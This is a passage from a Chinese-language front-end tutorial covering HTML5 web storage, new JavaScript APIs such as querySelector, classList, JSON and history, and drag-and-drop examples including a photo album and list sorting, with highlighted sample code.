AMap.ContextMenu(&#123;<span class="attr">isCustom</span>:<span class="literal">true</span>,<span class="attr">content</span>:menuContext&#125;);</span><br><span class="line"><span class="comment">//给地图绑鼠标右键功能弹出右键菜单</span></span><br><span class="line">AMap.event.addListener(map,<span class="string">"rightclick"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">	contextMenu.open(map,e.lnglat);<span class="comment">//e.lnglat鼠标点击的经纬度</span></span><br><span class="line">	contextMenuPosition = e.lnglat;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//右键菜单缩放地图</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">zoomMenu</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(n === <span class="number">0</span>)&#123;map.zoomOut();&#125;</span><br><span class="line">	<span class="keyword">if</span>(n === <span class="number">1</span>)&#123;map.zoomIn();&#125;</span><br><span class="line">	contextMenu.close();</span><br><span class="line">&#125;</span><br><span class="line">contextMenu.close();</span><br><span class="line"><span class="comment">//测量距离功能</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">distanceMeasureMenu</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	mouseTool.rule();</span><br><span class="line">	contextMenu.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//添加标注功能</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addMarkerMenu</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	mouseTool.close();</span><br><span class="line">	<span class="keyword">var</span> marker = <span class="keyword">new</span> AMap.Marker(&#123;</span><br><span class="line">		map: map,</span><br><span class="line">		position: contextMenuPosition, <span class="comment">//基点位置</span></span><br><span class="line">		offset: &#123;<span class="attr">x</span>:<span class="number">-5</span>,<span class="attr">y</span>:<span class="number">-10</span>&#125; <span class="comment">//相对于基点位置</span></span><br><span class="line">	&#125;);</span><br><span class="line">	contextMenu.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//搜索城市</span></span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> val = city.value;</span><br><span class="line">	map.setCity(val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://codepen.io/poetries/pen/xgGwaZ" target="_blank" rel="noopener">在线演示</a></p>
<h4 id="本地存储"><a class="markdownIt-Anchor" href="#本地存储"></a> 本地存储</h4>
<hr />
<ul>
<li>
<p><strong><code>Storage</code></strong></p>
<ul>
<li><code>sessionStorage</code>
<ul>
<li><code>session</code>临时回话，从页面打开到页面关闭的时间段</li>
<li>窗口的临时存储，页面关闭，本地存储消失</li>
</ul>
</li>
<li><code>localStorage</code>
<ul>
<li>永久存储（可以手动删除数据）</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong><code>Storage</code>的特点</strong></p>
<ul>
<li>存储量限制 ( 5M )</li>
<li>客户端完成，不会请求服务器处理</li>
<li><code>sessionStorage</code>数据是不共享、 <code>localStorage</code>共享</li>
</ul>
</li>
<li>
<p><strong><code>Storage API</code></strong></p>
<ul>
<li><code>setItem()</code>:
<ul>
<li>设置数据，(<code>key</code>,<code>value</code>)类型，类型都是字符串</li>
<li>可以用获取属性的形式操作</li>
</ul>
</li>
<li><code>getItem():</code>
<ul>
<li>获取数据，通过<code>key</code>来获取到相应的<code>value</code></li>
</ul>
</li>
<li><code>removeItem()</code>:
<ul>
<li>删除数据，通过key来删除相应的<code>value</code></li>
</ul>
</li>
<li><code>clear()</code>:
<ul>
<li>删除全部存储的值</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>存储事件:</strong></p>
<ul>
<li>当数据有修改或删除的情况下，就会触发<code>storage</code>事件</li>
<li>在对数据进行改变的窗口对象上是不会触发的</li>
<li><code>Key</code> : 修改或删除的<code>key</code>值，如果调用<code>clear()</code>,<code>key</code>为<code>null</code></li>
<li><code>newValue</code>  :  新设置的值，如果调用<code>removeStorage()</code>,<code>key</code>为<code>null</code></li>
<li><code>oldValue</code> :  调用改变前的<code>value</code>值</li>
<li><code>storageArea</code> : 当前的<code>storage</code>对象</li>
<li><code>url</code> :  触发该脚本变化的文档的url</li>
<li>注：<code>session</code>同窗口才可以,例子：<code>iframe</code>操作</li>
</ul>
</li>
</ul>
<h3 id="第十六课-html5新增js方法"><a class="markdownIt-Anchor" href="#第十六课-html5新增js方法"></a> 第十六课 HTML5新增JS方法</h3>
<hr />
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-aec985a8f543f52e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="H5在JavaScript中新增的方法一览" /></p>
<ul>
<li>
<p><strong>新增选择器</strong></p>
<ul>
<li><code>document.querySelector()</code> 选择单个元素</li>
<li><code>document.querySelectorAll()</code> 选择所有的</li>
<li><code>document.getElementsByClassName()</code> 通过类名选择</li>
</ul>
</li>
<li>
<p><strong>延迟加载JS</strong></p>
<ul>
<li><code>JS</code>的加载会影响后面的内容加载
<ul>
<li>很多浏览器都采用了并行加载JS，但还是会影响其他内容</li>
</ul>
</li>
<li><code>Html5</code>的<code>defer</code>和<code>async</code>
<ul>
<li><code>defer=“defer ”</code>: 延迟加载，会按顺序执行，在<code>onload</code>执行前被触发</li>
<li><code>async =“async”</code>: 异步加载，加载完就触发，有顺序问题</li>
</ul>
</li>
<li>浏览器兼容性：<code>Labjs</code>库</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 动态加载script文件 （推荐方法） 只需请求一次 可加载多个JavaScript文件，减少请求次数以及页面的加载阻塞</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadScript</span>(<span class="params">url,callback</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">	script.type = <span class="string">"text/javascript"</span>;</span><br><span class="line">	<span class="keyword">if</span>(script.readyState)&#123;<span class="comment">//IE</span></span><br><span class="line">		script.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(script.readyState == <span class="string">"loaded"</span> || script.readyState == <span class="string">"complete"</span>)&#123;</span><br><span class="line">				onreadystatechange = <span class="literal">null</span>;</span><br><span class="line">				callback();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		script.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			callback();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	script.src = url;</span><br><span class="line">	<span class="built_in">document</span>.getElementsByTagName(<span class="string">"head"</span>)[<span class="number">0</span>].appendChild(script);</span><br><span class="line">&#125;</span><br><span class="line">loadScript(<span class="string">"js/defer.js"</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"加载成功"</span>);</span><br><span class="line">      <span class="comment">//  加载成功回调</span></span><br><span class="line">&#125;);</span><br><span class="line">loadScript(<span class="string">"js/async.js"</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"加载成功"</span>);</span><br><span class="line">   <span class="comment">//  加载成功回调</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><strong>获取<code>class</code>列表属性</strong></p>
<ul>
<li><code>classList</code>
<ul>
<li><code>length</code> :  <code>class</code>的长度</li>
<li><code>add()</code> :  添加<code>class</code>方法</li>
<li><code>remove()</code>  :  删除<code>class</code>方法</li>
<li><code>toggle()</code> :  切换<code>class</code>方法</li>
<li><code>contains()</code> : 判断类名是否存在返回<code>bool</code>值</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong><code>JSON</code>的新方法</strong></p>
<ul>
<li>
<p><code>parse()</code> : 把字符串转成<code>json</code></p>
<ul>
<li>字符串中的属性要严格的加上引号</li>
</ul>
</li>
<li>
<p><code>stringify()</code> : 把<code>json</code>转化成字符串</p>
<ul>
<li>会自动的把双引号加上</li>
</ul>
</li>
<li>
<p>与<code>eval</code>的区别</p>
<ul>
<li><code>eval()</code>：对任何的字符串进行解析变成js</li>
<li><code>parse()</code>：字符串中的属性要严格的加上引号</li>
</ul>
</li>
<li>
<p>其他浏览器兼容</p>
<ul>
<li><a href="http://www.json.org/" target="_blank" rel="noopener">去下载json2.js</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>历史管理</strong></p>
<ul>
<li><code>onhashchange</code> ：改变hash值来管理</li>
<li><code>history</code>  ：
<ul>
<li>服务器下运行
<ul>
<li><code>pushState</code> :  三个参数 ：数据  标题(都没实现)  地址(可选)</li>
<li><code>onpopstate</code>事件 :  读取数据   <code>event.state</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="第十七课-html5拖拽事件"><a class="markdownIt-Anchor" href="#第十七课-html5拖拽事件"></a> 第十七课 HTML5拖拽事件</h3>
<hr />
<ul>
<li>
<p>图片自带拖拽功能</p>
</li>
<li>
<p>其他元素可设置<code>draggable</code>属性</p>
</li>
<li>
<p><strong><code>draggable ：true</code></strong></p>
<ul>
<li>拖拽元素(被拖拽元素对象)事件 :
<ul>
<li><code>ondragstart</code> : 拖拽前触发</li>
<li><code>ondrag</code> :拖拽前、拖拽结束之间，连续触发</li>
<li><code>ondragend</code> :拖拽结束触发</li>
</ul>
</li>
<li>目标元素(拖拽元素被拖到的对象)事件 :
<ul>
<li><code>ondragenter</code> :进入目标元素触发</li>
<li><code>ondragover</code>:进入目标、离开目标之间，连续触发</li>
<li><code>ondragleave</code> :离开目标元素触发</li>
<li><code>ondrop</code> :在目标元素上释放鼠标触发
<ul>
<li>需要在<code>ondragover</code>事件里面阻止默认事件</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>拖拽兼容问题</strong></p>
<ul>
<li>火狐浏览器下需设置<code>dataTransfer</code>对象才可以拖拽除图片外的其他标签
<ul>
<li>
<p><code>dataTransfer</code>对象</p>
</li>
<li>
<p><code>setData()</code> : 设置数据 <code>key</code>和<code>value</code>(必须是字符串)</p>
</li>
<li>
<p><code>getData()</code> : 获取数据，根据<code>key</code>值，获取对应的<code>value</code></p>
</li>
<li>
<p><code>effectAllowed</code> : 设置光标样式(<code>none</code>, <code>copy</code>, <code>copyLink</code>, <code>copyMove</code>, <code>link</code>, <code>linkMove</code>,<code>move</code>, <code>all</code> 和<code>uninitialized</code>)</p>
</li>
<li>
<p><code>setDragImage</code> ：三个参数（指定的元素，坐标<code>X</code>，坐标<code>Y</code>）</p>
</li>
<li>
<p><code>files</code>： 获取外部拖拽的文件，返回一个<code>filesList</code>列表</p>
<ul>
<li><code>filesList</code>下有个<code>type</code>属性，返回文件的类型</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>读取文件信息</strong></p>
<ul>
<li><code>FileReader</code>(读取文件信息)
<ul>
<li><code>readAsDataURL</code></li>
</ul>
</li>
<li>参数为要读取的文件对象
<ul>
<li><code>onload</code>当读取文件成功完成的时候触发此事件</li>
<li><code>this. result</code> 获取读取的文件数据</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>examp01 拖拽案例</strong></p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"drap"</span> <span class="attr">draggable</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#drap</span> &#123;</span><br><span class="line">	<span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">	<span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">	<span class="attribute">background</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#box</span> &#123;</span><br><span class="line">	<span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">	<span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">	<span class="attribute">border</span>: <span class="number">2px</span> solid blue;</span><br><span class="line">	<span class="attribute">margin</span>: <span class="number">50px</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//被拖拽元素事件</span></span><br><span class="line">drap.ondragstart = <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>)</span>&#123; <span class="comment">// 拖拽前</span></span><br><span class="line">	<span class="keyword">var</span> ev = ev || <span class="built_in">window</span>.event;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//火狐浏览器下需设置dataTransfer对象才可以拖拽除图片外的其他标签</span></span><br><span class="line">	ev.dataTransfer.setData(<span class="string">"key"</span>,<span class="string">"poetries"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//effectAllowed : 设置光标样式(none, copy, copyLink, copyMove, link, linkMove,move, all 和uninitialized)</span></span><br><span class="line">	ev.dataTransfer.effectAllowed = <span class="string">"copy"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置被拖拽的小元素 setDragImage ：三个参数（指定的元素，坐标X，坐标Y）</span></span><br><span class="line">	ev.dataTransfer.setDragImage(pic,<span class="number">25</span>,<span class="number">25</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">this</span>.style.background = <span class="string">"green"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">drap.ondrag = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">// 拖拽过程中</span></span><br><span class="line">	<span class="keyword">this</span>.innerText = <span class="string">"被拖拽中..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">drap.ondragend = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">// 拖拽结束</span></span><br><span class="line">	<span class="keyword">this</span>.style.background = <span class="string">"red"</span>;</span><br><span class="line">	<span class="keyword">this</span>.innerHTML = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//目标元素事件</span></span><br><span class="line">box.ondragenter = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">//进入目标元素触发</span></span><br><span class="line">	<span class="keyword">this</span>.innerHTML = <span class="string">"可将文件拖放到这里!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">box.ondragover = <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>)</span>&#123; <span class="comment">//进入目标、离开目标之间，连续触发</span></span><br><span class="line">	<span class="keyword">var</span> ev = ev || <span class="built_in">window</span>.event;</span><br><span class="line">	ev.preventDefault(); </span><br><span class="line">	<span class="keyword">this</span>.style.background = <span class="string">"pink"</span>;</span><br><span class="line">&#125;</span><br><span class="line">box.ondragleave = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">//离开目标元素触发</span></span><br><span class="line">	<span class="keyword">this</span>.innerHTML = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">this</span>.style.background = <span class="string">"none"</span>;</span><br><span class="line">&#125;</span><br><span class="line">box.ondrop = <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>)</span>&#123;<span class="comment">//在目标元素上释放鼠标触发</span></span><br><span class="line">	<span class="comment">//alert("拖放结束")</span></span><br><span class="line">	<span class="keyword">this</span>.innerHTML = ev.dataTransfer.getData(<span class="string">"key"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://codepen.io/poetries/pen/Ndqaxx" target="_blank" rel="noopener">在线演示</a></p>
<ul>
<li><strong>example02 拖拽相册</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>请拖拽图片到红框中<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>可以将文件拖放到这里！！<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"dustbin"</span>&gt;</span>垃圾回收站<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#box</span>&#123;</span><br><span class="line">	<span class="attribute">position</span>:relative;</span><br><span class="line">	<span class="attribute">width</span>:<span class="number">500px</span>;</span><br><span class="line">	<span class="attribute">height</span>:<span class="number">500px</span>;</span><br><span class="line">	<span class="attribute">border</span>:<span class="number">2px</span> solid red;</span><br><span class="line">	<span class="attribute">margin</span>:<span class="number">100px</span> auto <span class="number">0px</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#box</span> <span class="selector-tag">span</span>&#123;</span><br><span class="line">	<span class="attribute">position</span>:absolute;</span><br><span class="line">	<span class="attribute">left</span>:<span class="number">0</span>;</span><br><span class="line">	<span class="attribute">top</span>:<span class="number">0</span>;</span><br><span class="line">	<span class="attribute">right</span>:<span class="number">0</span>;</span><br><span class="line">	<span class="attribute">bottom</span>:<span class="number">0</span>;</span><br><span class="line">	<span class="attribute">height</span>:<span class="number">50px</span>;</span><br><span class="line">	<span class="attribute">width</span>:<span class="number">192px</span>;</span><br><span class="line">	<span class="attribute">margin</span>:auto;</span><br><span class="line">	<span class="attribute">display</span>:none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">img</span>&#123;</span><br><span class="line">	<span class="attribute">width</span>:<span class="number">100px</span>;<span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#dustbin</span>&#123;</span><br><span class="line">	<span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">	<span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">	<span class="attribute">background</span>:<span class="number">#000</span>;</span><br><span class="line">	<span class="attribute">color</span>:<span class="number">#fff</span>;</span><br><span class="line">	<span class="attribute">font-size</span>:<span class="number">40px</span>;</span><br><span class="line">	<span class="attribute">text-align</span>:center;</span><br><span class="line">	<span class="attribute">line-height</span>:<span class="number">100px</span>;</span><br><span class="line">	<span class="attribute">margin</span>:auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> box = <span class="built_in">document</span>.getElementById(<span class="string">"box"</span>);</span><br><span class="line"><span class="keyword">var</span> dusTbin = <span class="built_in">document</span>.getElementById(<span class="string">"dustbin"</span>);</span><br><span class="line"><span class="keyword">var</span> span = box.getElementsByTagName(<span class="string">"span"</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//目标元素事件</span></span><br><span class="line"><span class="keyword">var</span> img = <span class="string">''</span>;</span><br><span class="line">box.ondragenter = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//进入目标元素触发</span></span><br><span class="line">	span.style.display = <span class="string">"block"</span>;</span><br><span class="line">&#125;</span><br><span class="line">box.ondragover = <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>)</span>&#123;<span class="comment">//在目标元素上连续触发</span></span><br><span class="line">	<span class="keyword">var</span> ev = ev||<span class="built_in">window</span>.event;</span><br><span class="line">	ev.preventDefault();<span class="comment">//阻止默认事件</span></span><br><span class="line">	span.style.display = <span class="string">"block"</span>;</span><br><span class="line">&#125;</span><br><span class="line">box.ondragleave = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//离开目标元素</span></span><br><span class="line">	span.style.display = <span class="string">"none"</span>;</span><br><span class="line">&#125;</span><br><span class="line">box.ondrop = <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>)</span>&#123;<span class="comment">//在目标元素上面释放鼠标触发</span></span><br><span class="line">	<span class="comment">//alert("拖拽结束！！");</span></span><br><span class="line">	<span class="keyword">var</span> ev = ev||<span class="built_in">window</span>.event;</span><br><span class="line">	ev.preventDefault();<span class="comment">//阻止默认事件</span></span><br><span class="line">	span.style.display = <span class="string">"none"</span>;</span><br><span class="line">	<span class="keyword">var</span> file = ev.dataTransfer.files;</span><br><span class="line">	<span class="comment">//alert(file[0].type);</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;file.length ;i++ )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (file[i].type.indexOf(<span class="string">"image"</span>)!=<span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">var</span> read = <span class="keyword">new</span> FileReader();<span class="comment">//新建一个读取文件对象</span></span><br><span class="line">			read.readAsDataURL(file[i]);<span class="comment">//读取文件</span></span><br><span class="line">			read.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//读取文件成功之后调用什么函数</span></span><br><span class="line">				<span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">				<span class="comment">//alert(this.result);</span></span><br><span class="line">				img.src = <span class="keyword">this</span>.result;</span><br><span class="line">				box.appendChild(img);</span><br><span class="line">				<span class="comment">//获取img节点 实现删除功能</span></span><br><span class="line">				<span class="keyword">var</span> oImg = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"img"</span>);</span><br><span class="line">				<span class="keyword">if</span> (oImg)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">for</span> (<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;oImg.length ;j++ )</span><br><span class="line">					&#123;</span><br><span class="line">						oImg[j].ondragstart = <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>)</span>&#123;</span><br><span class="line">							ev.dataTransfer.setData(<span class="string">"data"</span>,ev.target.innerHTML);</span><br><span class="line">							img = ev.target;</span><br><span class="line">						&#125;</span><br><span class="line">						oImg[j].ondragend = <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>)</span>&#123;</span><br><span class="line">							ev.dataTransfer.clearData(<span class="string">"data"</span>);<span class="comment">//清楚数据</span></span><br><span class="line">							img = <span class="literal">null</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">//实现删除功能(移除img节点)</span></span><br><span class="line">				dusTbin.ondragover = <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>)</span>&#123;</span><br><span class="line">					ev.preventDefault();</span><br><span class="line">				&#125;</span><br><span class="line">				dusTbin.ondrop = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">					<span class="keyword">if</span> (img)</span><br><span class="line">					&#123;</span><br><span class="line">						img.parentNode.removeChild(img);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			alert(<span class="string">"请上传图片！"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://codepen.io/poetries/pen/Ndqagr" target="_blank" rel="noopener">在线演示</a></p>
<ul>
<li><strong>example03 拖拽排序</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrap"</span> <span class="attr">id</span>=<span class="string">"wrap"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">"background:#f3f"</span> <span class="attr">draggable</span>=<span class="string">"true"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">"background:#ff6"</span> <span class="attr">draggable</span>=<span class="string">"true"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">"background:#c60"</span> <span class="attr">draggable</span>=<span class="string">"true"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">"background:#903"</span> <span class="attr">draggable</span>=<span class="string">"true"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">"background:#0f6"</span> <span class="attr">draggable</span>=<span class="string">"true"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">"background:#636"</span> <span class="attr">draggable</span>=<span class="string">"true"</span>&gt;</span>6<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">"background:#36f"</span> <span class="attr">draggable</span>=<span class="string">"true"</span>&gt;</span>7<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">"background:#033"</span> <span class="attr">draggable</span>=<span class="string">"true"</span>&gt;</span>8<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.wrap</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">500px</span>;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">500px</span>;</span><br><span class="line">  <span class="attribute">margin</span>:<span class="number">50px</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;</span><br><span class="line">  <span class="attribute">list-style</span>:none;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">500px</span>;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">color</span>:<span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">text-align</span>:center;</span><br><span class="line">  <span class="attribute">line-height</span>:<span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">font-size</span>:<span class="number">40px</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>:bold;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> oUl = <span class="built_in">document</span>.getElementById(<span class="string">"box"</span>);</span><br><span class="line"><span class="keyword">var</span> oLi = oUl.getElementsByTagName(<span class="string">"li"</span>);</span><br><span class="line"><span class="keyword">var</span> curr = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sort</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; oLi.length;i++) &#123;</span><br><span class="line">    oLi[i].index = i;</span><br><span class="line">    oLi[i].ondragstart = <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> ev = ev || <span class="built_in">window</span>.event;</span><br><span class="line">      ev.dataTransfer.setData(<span class="string">"data"</span>,<span class="keyword">this</span>.innerHTML);</span><br><span class="line">      <span class="comment">//this.innerHTML = "被拖拽中...";</span></span><br><span class="line">      curr = <span class="keyword">this</span>.index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    oLi[i].ondragenter = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; oLi.length;i++)&#123;</span><br><span class="line">        oLi[i].style.border = <span class="string">"none"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(curr != <span class="keyword">this</span>.index)&#123;</span><br><span class="line">        <span class="keyword">this</span>.style.border = <span class="string">"2px solid #000"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    oLi[i].ondragover = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> e = e || <span class="built_in">window</span>.event;</span><br><span class="line">      e.preventDefault();</span><br><span class="line">    &#125;</span><br><span class="line">    oLi[i].ondrop = <span class="function"><span 